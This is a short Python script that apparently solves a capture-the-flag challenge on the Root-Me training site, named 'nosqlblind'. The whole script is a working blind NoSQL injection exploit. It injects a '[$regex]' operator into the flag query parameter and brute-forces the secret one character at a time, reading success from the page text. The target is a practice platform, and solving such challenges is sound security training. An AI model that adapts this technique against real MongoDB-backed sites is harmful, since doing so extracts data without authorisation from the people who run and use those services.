import requests # Send request
from bs4 import BeautifulSoup # For HTML pretty print
import itertools as iter # For multi-range loop efficiency
import time # For time execution, if you like

# Parameters
challenge_name = "nosqlblind"
flag = ""
key = "[$regex]"

position = 0

# >>>>>>>>>>>>>>> START

start_time = time.time()

while True:
    count_to_stop = 0 
    for dec in iter.chain(range(33, 127)):
        count_to_stop += 1
        if chr(dec) not in ['*','+','.','?','|','&','$']:
            print("Try with flag: %s in index %d" % (flag + chr(dec), position))
            query = "http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=%s&flag%s=^(%s)" \
            % (challenge_name, key, flag + chr(dec))
            print("Using query: %s" % (query))

            # Send GET request with query
            req = requests.get(query)

            # Parse into HTML pretty format 
            response_pretty = BeautifulSoup(req.content, 'html.parser')

            # Check if we bypass successfully
            if "Yeah this is the flag for" not in response_pretty.div.contents[0]:
                print("Wrong")
            if "Yeah this is the flag for" in response_pretty.div.contents[0]:
                print("====================   FOUND !!!   ======================")
                flag += chr(dec)
                position += 1
                break
    if count_to_stop == 94: # The number of all used characters in one loop. If we go through all without exact one, then we finish.
        break

print("The final flag is: %s" %(flag))
# >>>>>>>>>>>>>>> STOP
stop_time = time.time()

# Time execution
time_exe = stop_time - start_time
print("Time execution: %.2f"  % (time_exe) )